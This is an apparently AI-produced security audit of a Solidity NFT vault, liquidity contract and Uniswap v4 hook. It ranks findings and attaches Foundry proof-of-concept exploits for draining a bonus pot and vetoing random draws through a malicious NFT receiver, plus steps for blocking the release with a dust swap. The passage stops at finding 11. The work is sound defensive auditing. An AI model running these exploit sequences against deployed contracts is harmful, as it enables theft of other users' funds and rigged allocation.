# Audit report

> Perform an independent, adversarial security and specification-compliance audit of Ink & Inference.
>
> Repository: https://github.com/identity-md-launches/launch-1683-ink
> Audit this exact commit: 500eb996d7758bde7066dc63bbdadc4a2dafba5f
>
> AUDIT ONLY. Do not deploy contracts, launch a token, create or fund pools, upload artwork, open claims, execute transactions, or apply irreversible locks. Do not modify the implementation as part of this review. Return findings and recommended fixes.
>
> Scope:
> All five application contracts—InkPortraits, InkVault, InkLiquidity, InkHook and InkRenderer—plus interfaces, tests, fixtures, upload/snapshot tooling, compiler configuration, pinned dependencies, ABIs and setup documentation.
>
> Read README.md, docs/SECURITY.md, docs/ROUTER.md, docs/VALIDATION.md and docs/SETUP.md. Treat the previous implementation agent’s checks and automated review as untrusted claims to verify, not as an independent audit.
>
> Priorities:
>
> 1. Vault solvency and NFT accounting.
> Verify the 2000 combined portrait limit, 400000 INK backing per circulating portrait and pending pull, claim reserves, inventory uniqueness/custody, returned-inventory reuse, bonus segregation and absence of backing withdrawals. Exercise adversarial sequences, reentrancy, failed transfers and malicious NFT receivers.
>
> 2. Free claims and snapshot proofs.
> Verify current seat ownership, seat IDs 0–1999, one claim per seat, inclusion of inactive seats, the 24-hour boundaries and exact StandardMerkleTree leaf encoding:
> keccak256(bytes.concat(keccak256(abi.encode(seat,accepted,rateBps,turns,hoursTenths,outdated)))).
> Use synthetic data only. The production snapshot is not supplied.
>
> 3. Release and permanent liquidity.
> Verify unclaimed reserves move into a real single-sided Uniswap v4 position atomically, failed additions roll back the entire release, and no approval, transfer, permit, collection, decrease-liquidity or burn path can remove locked assets. Assess stale-price/range manipulation and the seven-day trading fallback.
>
> 4. Draws and economic attacks.
> Investigate next-block hash manipulation, selective revelation, full expiry refunds, inventory manipulation, reservation exhaustion and selective acquisition of agent NFTs. Model the exploitability of repeatedly drawing/acquiring and returning the same agent NFT to drain the bonus pot. Quantify costs, benefits and affected funds. Distinguish protected backing from drainable bonuses and unfair allocation. Do not dismiss these issues merely because documentation discloses them. Recommend minimal fixes and clearly identify any changes to the requested economics or randomness mechanism.
>
> 5. Uniswap v4 hook.
> Verify callback and pool authentication, immutable router trader authentication, exact-input/output fees, both currency orderings, afterSwap deltas and settlement. Verify the 25 bps hook fee, agent-holder exemption, IMD treasury destination and INK dead-address destination. This is not IMD burning.
> Verify the opening lock, first-successful-swap clock and one-hour cumulative 1200000 INK buy cap, including exempt wallets, nested router plans, distinct recipients, failed swaps, smart accounts and unsupported aggregators. Check the pinned Universal Router implementation actually supports the claimed identity mechanism. Separate local source compatibility from deployed Ethereum address verification.
>
> 6. Renderer and tooling.
> The original artwork is available to the project owner but was intentionally NOT supplied to this swarm build. Do not invent replacement art or claim original-art fidelity has been verified. Audit chunk integrity, upload resumption/restarts, expected hashes, independent script/preview locks, renderer-selection lock, executable HTML safety and realistic gas/RPC limits. Assess whether integration with the owner’s original script requires an adapter.
>
> 7. Build and deployment readiness.
> Reproduce the documented Solidity and Python checks. Verify dependency pinning, ABI/constructor consistency, deployable bytecode sizes, CREATE2 hook permissions and setup order. Check for unsafe ownership/configuration transitions and irreversible mistakes. Identify missing tests rather than relying only on passing tests. Do not guess production addresses.
>
> Deliver:
> - A severity-ranked report with file/function references, exploit conditions, impact and recommended fixes.
> - Executable proof-of-concept or regression tests for concrete exploitable findings, where feasible.
> - A requirement-by-requirement compliance table.
> - Exact commands run, results, tool versions, and checks not performed.
> - A clear list of deployment blockers and unresolved design decisions.
> - The repository URL and exact audited commit.
>
> Use separate reviewers for accounting/economics, v4/router/liquidity, and renderer/tooling if the audit workflow supports it, followed by consolidated judgment. State what review actually occurred. Do not label this production-safe solely because tests pass.

| | |
|---|---|
| Repository | https://github.com/identity-md-launches/launch-1683-ink.git |
| Commit | `500eb996d7758bde7066dc63bbdadc4a2dafba5f` |
| Job | `45527f4a-322a-441e-b653-67e01224d0e9` |
| Judged | 2026-10-14 12:51 UTC |
| Findings | 2 high · 3 medium · 4 low · 3 info |

Four agents audited the code as it is at `500eb99`, each in one area (math, permissions, economics, control flow),
and a judge reproduced, merged and ranked what they found, then read the code once more itself. Nothing in the repository was changed or deployed.

## Findings

### 1. High: Agent return bonus is paid on every return of the same seat; one holder drains the whole bonus pot by cycling return -> pull -> reveal

`src/InkVault.sol:215`

```
            bonus = PRICE * bonusBps / 10000;
```

InkVault.returnPortrait pays PRICE + min(bonusPot, bonusBps * PRICE) on every agent id (< 2000) with no per-seat or per-claimant memory, and the returned agent is pushed straight back into _inventory. pull() costs exactly PRICE and reveal() picks _inventory[seed % count]; when the attacker's agent is the only inventory entry the draw is deterministic (seed % 1 == 0), and with larger inventory the attacker can combine the receiver veto / inventory steering findings. Each return/pull/reveal cycle therefore nets +20,000 INK (5% of 400,000) for three transactions of gas, with the 400,000 INK only parked for two blocks. bonusPot is funded by other users' 1%/0.5% swarm-return fees and fundBonus donations, so the whole pot is transferable to a single agent holder and every later honest agent returner receives PRICE + 0. Backing is never touched (balance == liabilities throughout) and this is the drainable-bonus class, not protected backing. SECURITY.md discloses the behaviour; disclosure does not reduce the loss. Merged from four specialist reports (economics, flow, permissions, math) that reproduced the same mechanism. Recommended minimal fix (changes the requested 'agent return pays backing plus bonus' rule, so needs the requester's decision): pay the agent bonus at most once per seat id (mapping(uint256 => bool) bonusPaid set in returnPortrait), or only when the agent's most recent acquisition was not a vault draw (track drawn[id] in reveal). Either keeps PRICE backing, fees and the blockhash draw unchanged. The attached proof passes with the once-per-seat rule.

**Reproduction**

Verified by running .imd/reads/proofs/Proof_9e98edabc33a.t.sol (copied to test/scratch/): forge test --match-path test/scratch/Proof_9e98edabc33a.t.sol fails with 'same agent NFT drained bonus pot repeatedly: 620000000000000000000000 > 420000000000000000000000'. State: released vault, alice owns agent 0, bonusPot = 400,000 INK (donor), inventory empty. alice returnPortrait(0) -> +420,000. Then 10x: pull() (-400,000), reveal(req) at entropyBlock+1 with any blockhash returns id 0 because inventory == [0], returnPortrait(0) -> +420,000. Expected: one agent NFT yields at most one bonus, net gain <= 420,000 INK. Actual: net gain 620,000 INK (11 bonuses, 220,000 INK taken from the pot); 20 cycles empty the pot. The second proof .imd/reads/proofs/Proof_63973d28dcb5.t.sol also fails ('attacker extracted bonus pot via free re-roll cycles: 600000e18 > 400000e18') using receiver-vetoed re-rolls with inventory [10000, 0] at zero INK cost.

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {InkVault} from "src/InkVault.sol";
import {InkPortraits} from "src/InkPortraits.sol";
import {AgentInputs, IInkLiquidity} from "src/interfaces/IInk.sol";

contract PlainInk is ERC20 {
    constructor(address to) ERC20("INK", "INK") {
        _mint(to, 1_000_000_000 ether);
    }
}

contract Seats is ERC721 {
    constructor() ERC721("Seat", "SEAT") {}

    function mint(address to, uint256 id) external {
        _mint(to, id);
    }
}

contract SinkLiquidity is IInkLiquidity {
    address public vault;
    address public ink;

    constructor(address vault_, address ink_) {
        vault = vault_;
        ink = ink_;
    }

    function ready() external pure returns (bool) {
        return true;
    }

    function addReleased(uint256) external {}
}

/// Repeatedly returning and re-drawing the same agent NFT collects the 5% agent bonus every cycle.
contract BonusDrainTest is Test {
    uint256 constant PRICE = 400000 ether;
    InkVault vault;
    InkPortraits portraits;
    PlainInk ink;
    Seats seats;
    address alice = makeAddr("alice");
    address donor = makeAddr("donor");
    AgentInputs inputs = AgentInputs(1, 100, 1, 1, false);

    function setUp() public {
        vm.warp(100000);
        portraits = new InkPortraits(address(this));
        vault = new InkVault(address(this), portraits);
        portraits.configureVault(address(vault));
        ink = new PlainInk(address(this));
        seats = new Seats();
        seats.mint(alice, 0);
        vault.configureAssets(IERC20(address(ink)), IERC721(address(seats)));
        SinkLiquidity liq = new SinkLiquidity(address(vault), address(ink));
        bytes32 root = vault.leaf(0, inputs); // single-leaf tree, empty proof
        ink.approve(address(vault), type(uint256).max);
        vault.fund(root, block.timestamp + 10, liq);
        ink.transfer(alice, 1_000_000 ether);
        ink.transfer(donor, 1_000_000 ether);
        vm.prank(alice);
        ink.approve(address(vault), type(uint256).max);
        vm.prank(alice);
        portraits.setApprovalForAll(address(vault), true);
        vm.prank(donor);
        ink.approve(address(vault), type(uint256).max);

        vm.warp(vault.claimStart());
        vm.prank(alice);
        vault.claim(0, inputs, new bytes32[](0));
        vm.warp(vault.claimStart() + 1 days);
        vault.release();
        // Bonus pot holds 100 swarm-return fees' worth (stands in for fees paid by other users).
        vm.prank(donor);
        vault.fundBonus(400000 ether);
    }

    function test_sameAgentCollectsBonusOnlyOnce() public {
        uint256 start = ink.balanceOf(alice);
        // First, legitimate return of the claimed agent.
        vm.prank(alice);
        vault.returnPortrait(0);
        // Inventory is exactly [0], so every pull deterministically re-draws agent 0.
        for (uint256 i; i < 10; ++i) {
            vm.prank(alice);
            uint256 req = vault.pull();
            (, uint256 eb) = vault.pulls(req);
            vm.roll(eb + 1);
            vm.setBlockhash(eb, keccak256(abi.encode(i)));
            assertEq(vault.reveal(req), 0);
            vm.prank(alice);
            vault.returnPortrait(0);
        }
        uint256 gained = ink.balanceOf(alice) - start;
        // One backing + one bonus is the most a single agent should yield.
        assertLe(gained, PRICE + PRICE * 500 / 10000, "same agent NFT drained bonus pot repeatedly");
    }
}
```

### 2. High: Contract buyer can veto any unfavourable draw from onERC721Received and take a full expiry refund (free option on every pull, and zero-cost capacity reservation)

`src/InkVault.sol:193`

```
            portraits.safeTransferFrom(address(this), request.buyer, id);
```

reveal() delivers with portraits.safeTransferFrom (inventory) and InkPortraits.mintSwarm -> _safeMint (fresh swarm), so the committed buyer's onERC721Received runs before delivery is final. A buyer contract that reverts unless the drawn id is an agent (id < 2000), or unless the swarm seed is to its liking, makes every unfavourable reveal revert for every caller: 'anyone may reveal' (the stated mitigation in SECURITY.md) does not help because the receiver check is identical for all revealers. The request stays open and after 256 blocks expire() (line 207) refunds exactly PRICE with no penalty. Combined with public entropy (blockhash known one block after the pull), the buyer gets a free option: accept only agent portraits (hook-fee waiver, 0.5% return discount, 20,000 INK bonus on return) or preferred inventory ids, reject the rest at the cost of gas and ~51 minutes of capital lockup. Honest EOA buyers absorb the rejected draws, which is unfair allocation, and the option is the engine of the zero-cost variant of the bonus drain. Second consequence (merged from the reservation-exhaustion report, src/InkVault.sol:165): the same always-reverting receiver keeps pendingCount reserved for 257 blocks per 400,000 INK, and because expire() and pull() are both permissionless they can be batched in one transaction, so a holder of k x 400,000 INK can hold the last k capacity slots indefinitely at zero capital risk; every other pull() reverts NoCapacity. Fix that keeps the requested blockhash mechanism and economics: deliver with portraits.transferFrom in reveal() and _mint in InkPortraits.mintSwarm (a contract that chose to call pull() chose to receive an NFT), or escrow a rejected id for the buyer instead of reverting. Optionally make expiry forfeit the swarm deposit fee, which changes the stated full-refund rule and needs a product decision. The attached proof assumes direct (non-safe) delivery.

**Reproduction**

Verified by running .imd/reads/proofs/Proof_fa173a48d311.t.sol: forge test --match-path test/scratch/Proof_fa173a48d311.t.sol fails with 'only agents please'. State: released vault, inventory = [swarm 10000, agent 0]. PickyBuyer (onERC721Received requires id < 2000) calls pull() paying 400,000 INK; at entropyBlock+1 the seed is chosen so index 0 (the swarm) is drawn. Expected: reveal(req) delivers portrait 10000 to the buyer and consumes the request. Actual: reveal(req) reverts with the receiver's reason for every caller; .imd/reads/proofs/Proof_d4d7ef8c77e1.t.sol additionally shows expire(req) at entropyBlock+257 returning the full 400,000 INK ('buyer vetoed the draw and recovered the full 400000 INK'). Capacity variant: with circulating + pendingCount = 1995 the same contract pulls 5 times, and at entropyBlock+257 calls expire(req); pull() in one transaction; honest pull() reverts NoCapacity indefinitely.

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {InkVault} from "src/InkVault.sol";
import {InkPortraits} from "src/InkPortraits.sol";
import {AgentInputs, IInkLiquidity} from "src/interfaces/IInk.sol";

contract PocINK is ERC20 {
    constructor(address holder) ERC20("INK", "INK") {
        _mint(holder, 1000000000 ether);
    }
}

contract PocSeats is ERC721 {
    constructor() ERC721("seats", "SEAT") {}

    function mint(address holder, uint256 id) external {
        _mint(holder, id);
    }
}

contract PocLiquidity is IInkLiquidity {
    address public immutable vault;
    address public immutable ink;
    bool public ready = true;

    constructor(address vault_, address ink_) {
        vault = vault_;
        ink = ink_;
    }

    function addReleased(uint256) external view {
        require(msg.sender == vault, "vault");
    }
}

/// @dev A buyer that only accepts agent portraits (ids below 2000). Every other delivery is vetoed,
/// which leaves the request open until a full refund via expire().
contract PickyBuyer is IERC721Receiver {
    InkVault public immutable vault;

    constructor(InkVault vault_) {
        vault = vault_;
    }

    function pull() external returns (uint256) {
        return vault.pull();
    }

    function onERC721Received(address, address, uint256 id, bytes calldata) external pure returns (bytes4) {
        require(id < 2000, "only agents please");
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract SelectiveRevealTest is Test {
    InkVault internal vault;
    InkPortraits internal portraits;
    PocINK internal ink;
    PocSeats internal seats;
    PocLiquidity internal liquidity;
    address internal alice = makeAddr("alice");
    uint256 internal constant PRICE = 400000 ether;

    function setUp() public {
        vm.warp(100000);
        portraits = new InkPortraits(address(this));
        vault = new InkVault(address(this), portraits);
        portraits.configureVault(address(vault));
        ink = new PocINK(address(this));
        seats = new PocSeats();
        seats.mint(alice, 0);
        liquidity = new PocLiquidity(address(vault), address(ink));
        vault.configureAssets(IERC20(address(ink)), IERC721(address(seats)));
        AgentInputs memory inputs = AgentInputs(42, 9000, 50, 123, false);
        bytes32 root = vault.leaf(0, inputs);
        ink.approve(address(vault), 800000000 ether);
        vault.fund(root, block.timestamp + 10, liquidity);
        vm.warp(vault.claimStart());
        vm.prank(alice);
        vault.claim(0, inputs, new bytes32[](0));
        vm.warp(vault.claimStart() + 1 days);
        vault.release();
        ink.transfer(alice, 10000000 ether);
        vm.prank(alice);
        ink.approve(address(vault), type(uint256).max);
    }

    /// Inventory holds one swarm portrait and one agent portrait. A picky buyer pulls. The draw
    /// lands on the swarm portrait, so the buyer's receiver vetoes delivery. On the code as it is,
    /// reveal() reverts, the reservation stays open, and expire() hands the buyer a full refund:
    /// a free option to only ever accept agent draws. Expected: a committed buyer cannot veto an
    /// unfavourable draw (reveal must succeed and deliver whatever was drawn).
    function testBuyerCannotVetoUnfavourableDraw() public {
        // Put a swarm portrait and the agent portrait into inventory.
        vm.prank(alice);
        uint256 req = vault.pull();
        (, uint256 entropyBlock) = vault.pulls(req);
        vm.roll(entropyBlock + 1);
        vm.setBlockhash(entropyBlock, keccak256("mint a swarm"));
        uint256 swarmId = vault.reveal(req);
        assertEq(swarmId, 10000);
        vm.prank(alice);
        portraits.setApprovalForAll(address(vault), true);
        vm.prank(alice);
        vault.returnPortrait(swarmId);
        vm.prank(alice);
        vault.returnPortrait(0);
        assertEq(vault.inventoryCount(), 2);
        assertEq(vault.inventoryAt(0), swarmId);
        assertEq(vault.inventoryAt(1), 0);

        PickyBuyer buyer = new PickyBuyer(vault);
        ink.transfer(address(buyer), PRICE);
        vm.prank(address(buyer));
        ink.approve(address(vault), PRICE);
        uint256 balanceBefore = ink.balanceOf(address(buyer));
        uint256 pick = buyer.pull();
        (, uint256 pickBlock) = vault.pulls(pick);
        vm.roll(pickBlock + 1);
        // Find an entropy whose seed selects index 0 (the swarm portrait).
        bytes32 entropy;
        for (uint256 n = 0;; ++n) {
            entropy = keccak256(abi.encode("swarm draw", n));
            bytes32 seed = keccak256(abi.encode(entropy, pick, address(buyer), address(vault), block.chainid));
            if (uint256(seed) % 2 == 0) break;
        }
        vm.setBlockhash(pickBlock, entropy);

        // Defect: the committed buyer vetoes the swarm draw and keeps the option to be refunded in full.
        uint256 delivered = vault.reveal(pick);
        assertEq(delivered, swarmId, "the drawn swarm portrait must be delivered");
        assertEq(portraits.ownerOf(swarmId), address(buyer));
        assertEq(ink.balanceOf(address(buyer)), balanceBefore - PRICE);
        (address stillOpen,) = vault.pulls(pick);
        assertEq(stillOpen, address(0), "request must be consumed, no refund path may remain");
    }
}
```

### 3. Medium: Draw outcome is steerable after the entropy block: reveal index depends on live inventory length, which returnPortrait and other reveals change

`src/InkVault.sol:188`

```
            uint256 index = uint256(seed) % count;
```

The seed is fixed once blockhash(entropyBlock) exists, but the chosen id is _inventory[seed % _inventory.length] evaluated at reveal time. Between entropyBlock+1 and the reveal anyone can change the modulus and the slot order: returnPortrait() appends an id (count+1) and every other reveal swap-and-pops (count-1). Because reveal can be called in the same transaction as those state changes, the puller computes the seed off-chain, picks n in [count, count+m] (m = swarm portraits they hold) such that seed % n lands on an agent slot, returns n-count portraits and reveals atomically; if no n works they let the request expire for a full refund (see the receiver-veto finding). A griefer can equally front-run an honest reveal with a return to move a known agent away from the index. No block-producer control is needed, so this goes beyond the 'producer bias' disclosed in SECURITY.md. Cost: one swarm return fee (4,000 INK at 1%) per modulus step plus gas; benefit: an agent portrait with waiver/bonus value and a draw biased against all other pullers. Backing is unaffected; the loss is unfair allocation of agent inventory and bonus funds. Three specialists (flow, math, economics) reported the same mechanism; merged. Minimal fix preserving the next-block-hash mechanism: freeze the draw domain at pull time (store count in the Pull record and draw seed % storedCount, rejecting reveals whose index >= current length, or forbid inventory mutations while any request is between its entropy block and reveal), and deliver non-vetoably so the puller cannot discard a bad result. A verifiable randomness source would be the robust change and needs a scope decision.

**Reproduction**

Reproduced with test/scratch/ScratchVault.t.sol::testDrawSteeredByReturningBetweenEntropyAndReveal (PASS = attack works). State after release: inventory [10000 (swarm), 0 (agent)]; bob owns swarm 10001 and pulls in block n (request r). At block n+2 the blockhash H is public; the test chooses H such that seed = keccak256(abi.encode(H, r, bob, vault, chainid)) has seed % 2 == 0 (honest draw = swarm 10000) and seed % 3 == 1. bob calls returnPortrait(10001) (inventory [10000, 0, 10001]) and then reveal(r). Expected: the draw is determined by the committed entropy alone (swarm 10000). Actual: reveal returns id 0 and portraits.ownerOf(0) == bob. The project suites never mutate inventory between a pull's entropy block and its reveal, so the path is untested.

### 4. Medium: After the seven-day swap fallback a swap through the empty pool moves the price for free and makes release() revert; the owner cannot repair at the price limit and every repair can be front-run

`src/InkLiquidity.sol:122`

```
        _validateRange(price, tickLower, tickUpper);
```

addReleased re-validates the preset single-sided range against the live sqrtPriceX96 and reverts InvalidRange if the price is no longer strictly outside it; release() then reverts as a whole and pull() stays closed (requires released). InkVault.fund() requires liquidity.ready(), so the pool is always initialized before claims open, and InkHook._beforeSwap (line 149) opens swaps at initializedAt + 7 days regardless of release. If claimStart + 24h lands after that (SETUP.md step 7 advises a start 'sufficiently far in the future' and fund() has no check), or release is simply not called within the week, anyone can swap. Before release nothing has minted liquidity into the pool (SETUP.md step 6 makes the external allocation separate future work), and in Uniswap v4 Pool.swap a swap through zero liquidity moves sqrtPriceX96 to the price limit with amountIn = amountOut = 0, so a 1 wei exact-input via the pinned Universal Router pushes the price to tick 887271 for gas only. At that price no tick range satisfies _validateRange, so setReleaseRange cannot repair until someone swaps the price back (also free), and because setReleaseRange is owner-only while release() is permissionless, an EOA owner sending repair and release as separate transactions can be front-run every round. With seeded liquidity the same griefing costs only fees and slippage (the permissions specialist measured ~201k IMD for three blocked rounds against a 96m/96m pool). While release is blocked (2000 - claimedCount) x 400,000 INK sits in the vault with no owner withdrawal. Merged from three specialist reports (flow, permissions, math). Fix options that keep the economics: compute the release ticks relative to spot at execution inside addReleased (lower = next spacing-aligned tick strictly above the current tick plus an owner offset, upper = lower + width); or require vault.released() for swaps until the position exists (changes the fallback); or have fund() reject start + CLAIM_WINDOW >= initializedAt + 7 days; and document that the owner must batch repair + release from a contract.

**Reproduction**

Reproduced with test/scratch/ScratchV4.t.sol::testOneWeiSwapThroughEmptyPoolBlocksRelease (PASS = attack works) using the real pinned PoolManager, PositionManager and UniversalRouter with INK as currency0, pool initialized at tick 0 with release range [600, 1200] and no seeded liquidity. vm.warp(hook.initializedAt() + 7 days); bob executes SWAP_EXACT_IN_SINGLE IMD->INK with amountIn = 1, amountOutMinimum = 0. Logged: tick after 1 wei swap = 887271, imd paid = 0, ink received = 0. Expected: a free swap cannot invalidate the release. Actual: vault.release() reverts InkLiquidity.InvalidRange and liquidity.setReleaseRange(887220, 887280) also reverts InvalidRange (no valid range above the limit price). The project's own testPriceMovedReleaseRollbackAndRangeRepair shows the paid variant with seeded liquidity.

### 5. Medium: Buy-cap hour is anchored to the first successful swap, which a dust swap during the seven-day fallback can trigger before release; the release itself is then uncapped

`src/InkHook.sol:152`

```
        if (!tradingStarted) {
```

tradingStarted/firstSwapAt are set by the first successful swap of any size in either direction once _beforeSwap allows swaps, and _beforeSwap allows them at initializedAt + 7 days even when vault.released() is false. If the fallback is reached before release (claimStart + 24h > initializedAt + 7 days, which fund() does not prevent, or release not called for a week), anyone starts the clock with a 1 wei swap; one hour later bought[] is never checked again. release() is permissionless, so a sniper can bundle release() with an uncapped buy of the cheapest part of the newly locked single-sided position, which is exactly the opening the one-hour 1,200,000 INK cap was requested to protect. Merged from the economics (medium) and flow (low + info) reports. Fix preserving the stated 1-hour / 1.2m INK rule: only set tradingStarted/firstSwapAt when vault.released() is true (or re-arm the clock when release is observed), and/or have fund() reject start + CLAIM_WINDOW >= initializedAt + 7 days so the fallback can never precede release in the normal flow.

**Reproduction**

Reproduced with test/scratch/ScratchV4.t.sol::testFallbackDustSwapExpiresCapBeforeRelease (PASS = attack works), built on the project's V4IntegrationBase (INK = currency0, real PoolManager/PositionManager/UniversalRouter). vm.warp(hook.initializedAt() + 7 days); vault.released() is false; bob buys 1 INK-worth via the router (tradingStarted becomes true); vm.warp(hook.firstSwapAt() + 1 hours); vault.release() succeeds and mints the 800m INK position; in the same block alice does an exact-output buy of 5,000,000 INK. Expected: per-trader buys in the first hour of release-backed trading are capped at 1,200,000 INK (BuyCapExceeded). Actual: the buy succeeds, logged 'alice bought in the block of release (INK): 5000000', and hook.bought(alice) == 0.

### 6. Low: claim() mints with _safeMint to msg.sender only, so a seat held by a contract without onERC721Received can never claim and its 400,000 INK backing is swept to permanent liquidity

`src/InkPortraits.sol:63`

```
        _safeMint(recipient, seat);
```

InkVault.claim requires seats.ownerOf(seat) == msg.sender and then calls portraits.mintAgent(msg.sender, ...), which uses _safeMint. A seat owner that is a contract not implementing IERC721Receiver (legacy multisig without a fallback handler, a custodial or vesting contract, a marketplace escrow during the 24-hour window) reverts in the receiver check and has no alternative path: no recipient parameter and no delegate. After claimStart + 24h, release() moves that seat's 400,000 INK into the locked position irrevocably. Fix: add a recipient parameter to claim (checked against the current owner as caller) or mint with _mint; the agent can always be moved later by its owner. Reported by the flow specialist; confirmed.

**Reproduction**

Reproduced with test/scratch/ScratchVault.t.sol::testContractSeatOwnerWithoutReceiverCannotClaim. State: seat 1 owned by contract NoReceiverSeatHolder (no onERC721Received), valid two-leaf root and proof. The contract calls vault.claim(1, inputs, proof) inside the window. Expected: current owner of seat 1 receives agent 1. Actual: revert ERC721InvalidReceiver(holder); after claimStart + 24h release() succeeds and claimed[1] stays false, so the seat's reserve is released to liquidity.

### 7. Low: fund() accepts any future claimStart; a unit or digit mistake freezes the 800m INK reserve with no recovery path

`src/InkVault.sol:95`

```
            root == bytes32(0) || start < block.timestamp || start > type(uint256).max - CLAIM_WINDOW
```

The only upper bound on start is overflow safety. fund() pulls 800,000,000 INK and freezes root, start and liquidity in one call; there is no admin withdrawal, re-fund or way to shorten the start. A millisecond timestamp or an extra digit makes claim(), release() and every pull() unreachable for centuries while the full reserve sits in the vault. The owner is trusted, but the task asks to flag irreversible configuration mistakes and the contract gives the trusted owner no second chance. Fix: bound start to block.timestamp + a sane maximum (e.g. 30 days), which changes no economics; the same check is the natural place to enforce start + CLAIM_WINDOW < initializedAt + 7 days (see the fallback findings). Reported by the permissions specialist; confirmed.

**Reproduction**

Reproduced with test/scratch/ScratchVault.t.sol::testFundAcceptsMillisecondTimestamp. Owner calls configureAssets, approves 800m INK, then fund(root, 1760000000000, liquidity) (a 13-digit millisecond timestamp). Expected: revert InvalidConfiguration. Actual: fund succeeds, funded == true, claimStart == 1760000000000, vault balance 800,000,000 INK, and release() reverts WrongWindow (claim() and pull() are likewise unreachable).

### 8. Low: Agent-holder privileges key on the instantaneous agentBalance of the router initiator or caller: one relay contract or a flash-borrowed agent waives fees for anyone, and the buy cap is per address

`src/InkHook.sol:177`

```
        if (portraits.agentBalance(trader) != 0) return (IHooks.afterSwap.selector, 0);
```

_trader() resolves identity as the Universal Router locker (whoever called execute), and the waiver is granted when portraits.agentBalance(trader) != 0 at that instant; InkVault.returnPortrait (line 219) applies the same instantaneous check for the 0.5% discount. Nothing ties the initiator to the economic beneficiary or requires any holding period: a relay contract holding one agent portrait can forward execute() with TAKE to any user and every swap is fee-free (ROUTER.md documents this as an unsupported integration, not as a blocked one), an agent can be lent for the duration of a transaction to zero the 25 bps hook fee or halve the return fee, and the 1,200,000 INK cap only limits one address so N fresh wallets buy N x 1.2m in the opening hour. Backing is unaffected; the bonus pot and the treasury/burn receive less than the requested rules imply. Options: accept and document as a trust assumption; measure holding duration (record a per-address receipt timestamp in InkPortraits._update and require it to be older than the current block); the per-address cap cannot be made Sybil-resistant on-chain. Merged from the flow and permissions reports.

**Reproduction**

Code path: InkHook._afterSwap line 168 trader = _trader(sender) = router.msgSender(); line 177 returns without taking the fee when portraits.agentBalance(trader) != 0. The project's own testReviewNestedRouterPlanPreservesInitiatorAndRecipientBoundary shows the identity is the initiator and the TAKE recipient is distinct, and testWaiverTracksPortraitTransfersAndIgnoresHookData shows the waiver follows the portrait on transfer with no delay. Expected by the brief: agent holders pay no fee, others pay 25 bps, each buyer is capped at 1.2m INK in the first hour. Actual: a relay R holding agent 0 that calls router.execute(swap, SETTLE from R, TAKE to U) makes U's trade fee-free; transferring agent 0 to a trader in the same transaction as their swap or return and back afterwards yields fee 0 / 2,000 INK instead of 25 bps / 4,000 INK; ten fresh EOAs each buy 1,200,000 INK in the opening hour.

### 9. Low: tokenURI at the maximum script and preview sizes costs about 45.7M gas, above common eth_call limits, and nothing enforces a renderable size before an irreversible lock

`src/InkRenderer.sol:163`

```
                Base64.encode(script()),
```

tokenURI reads the 128 KiB script from storage (about 4,096 cold SLOADs), base64-encodes it inside a percent-encoded HTML data URL, concatenates the 32 KiB preview data URL and base64-encodes the whole JSON again. The project's own test records 45,655,466 gas for the maximum case. geth's default rpc.gascap is 50M and several hosted providers and marketplace indexers cap eth_call at 30M or lower, so a maximum-size upload would produce tokens whose metadata cannot be fetched, and lockScript/lockPreview make the size permanent. SETUP.md documents the number but MAX_SCRIPT_BYTES and the preview bound do not enforce a renderable size. Fix: lower the bounds to a size that renders comfortably under ~25M gas, or reference the script via a separate view instead of inlining it in the metadata. Reported by the flow specialist; confirmed from the test log.

**Reproduction**

Reproduced with the project's own test: forge test --match-test testMaximumAnimationMetadataFitsCallBudget -vv logs 'Maximum script and preview tokenURI gas: 45655466' (also recorded in docs/VALIDATION.md). Upload 16 chunks of 8,192 bytes, lockScript, setPreview with a 32,768-byte PNG, then eth_call portraits.tokenURI(id). Expected: metadata returned by a default provider. Actual: ~45.7M gas, which exceeds a 30M provider cap and leaves little margin under geth's 50M default.

### 10. Info: Single-sided liquidity computation overflows uint128 for far or very narrow ranges; setReleaseRange accepts such a range and release() only fails later

`src/InkLiquidity.sol:124`

```
        uint128 units = LiquidityAmounts.getLiquidityForAmounts(
```

getLiquidityForAmount0 computes mulDiv(amount0, sqrtA * sqrtB / Q96, sqrtB - sqrtA).toUint128(). With the full 800m INK reserve and a one-spacing-wide range at high ticks the quotient exceeds 2^128 and SafeCast reverts. _validateRange only checks ordering, spacing and side, so a range that can never mint can be locked in before funding and is discovered only when release() reverts at the end of the claim window. Recovery is setReleaseRange plus another release, so the impact is a delayed release rather than lost funds, and the triggering ranges are far from any realistic INK/IMD price. Fix: have _validateRange (or a view helper) run getLiquidityForAmounts for the maximum reserve and reject ranges that overflow or yield zero liquidity. Reported by the math specialist; confirmed.

**Reproduction**

Reproduced with test/scratch/ScratchVault.t.sol::testSingleSidedLiquidityOverflowsForFarRange: LiquidityAmounts.getLiquidityForAmounts(sqrtPrice at tick 0, sqrtPrice(600000), sqrtPrice(600060), 800000000e18, 0) reverts (SafeCastOverflow). Expected: setReleaseRange(600000, 600060) rejects a range that cannot mint; actual: it passes _validateRange and release() would revert later.

### 11. Info: setFees applies instantly with no caller-side minimum payout, so the owner can sandwich a single return with a 5x fee or a zero bonus

`src/InkVault.sol:230`

```
    function setFees(uint16 base, uint16 agent, uint16 bonus) external onlyOwner {
```

